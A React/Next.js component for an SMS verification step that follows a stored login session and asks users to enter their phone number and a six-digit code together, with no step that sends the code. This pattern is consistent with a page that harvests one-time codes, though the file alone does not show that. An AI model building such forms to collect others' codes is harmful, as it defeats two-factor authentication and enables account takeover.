"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Shield, ArrowLeft } from "lucide-react"
import { submitSmsVerification } from "@/app/actions/auth"

export function SmsVerificationForm() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [message, setMessage] = useState("")
  const [sessionId, setSessionId] = useState("")
  const router = useRouter()

  useEffect(() => {
    const storedSessionId = sessionStorage.getItem("loginSession")
    if (!storedSessionId) {
      router.push("/")
      return
    }
    setSessionId(storedSessionId)
  }, [router])

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault()
    setIsSubmitting(true)
    setMessage("")

    const formData = new FormData(e.currentTarget)
    const phoneNumber = formData.get("phoneNumber") as string
    const smsCode = formData.get("smsCode") as string

    try {
      const result = await submitSmsVerification(sessionId, phoneNumber, smsCode)
      if (result.success) {
        setMessage("SMS verification completed successfully! Data has been saved to browser storage.")
        sessionStorage.removeItem("loginSession")
        setTimeout(() => {
          router.push("/")
        }, 3000)
      } else {
        setMessage(result.error || "Verification failed")
      }
    } catch (error) {
      setMessage("An error occurred while processing your request.")
    } finally {
      setIsSubmitting(false)
    }
  }

  function goBack() {
    sessionStorage.removeItem("loginSession")
    router.push("/")
  }

  if (!sessionId) {
    return <div>Loading...</div>
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center space-x-2">
          <Shield className="w-5 h-5 text-green-600" />
          <h2 className="text-xl font-bold text-gray-800">SMS VERIFICATION</h2>
        </div>
        <Button variant="ghost" onClick={goBack} className="text-gray-600">
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back
        </Button>
      </div>

      <div className="text-sm text-gray-600 mb-6">
        For your security, we need to verify your identity. Please enter your phone number and the verification code
        that will be sent to your device.
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="phoneNumber" className="text-gray-700">
            Phone Number
          </Label>
          <Input
            id="phoneNumber"
            name="phoneNumber"
            type="tel"
            placeholder="(555) 123-4567"
            required
            className="w-full"
          />
        </div>

        <div className="space-y-2">
          <Label htmlFor="smsCode" className="text-gray-700">
            SMS Verification Code
          </Label>
          <Input
            id="smsCode"
            name="smsCode"
            type="text"
            placeholder="Enter 6-digit code"
            required
            className="w-full"
            maxLength={6}
          />
          <p className="text-xs text-gray-500">Enter the 6-digit code sent to your phone</p>
        </div>

        <Button
          type="submit"
          disabled={isSubmitting}
          className="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 rounded-full"
        >
          {isSubmitting ? "Verifying..." : "Verify & Complete"}
        </Button>

        {message && (
          <div
            className={`text-sm p-3 rounded ${
              message.includes("successfully") || message.includes("completed")
                ? "bg-green-100 text-green-700"
                : "bg-red-100 text-red-700"
            }`}
          >
            {message}
          </div>
        )}
      </form>

      <div className="text-center text-sm text-gray-500">
        <p>Didn't receive a code? Check your phone or contact support.</p>
      </div>
    </div>
  )
}
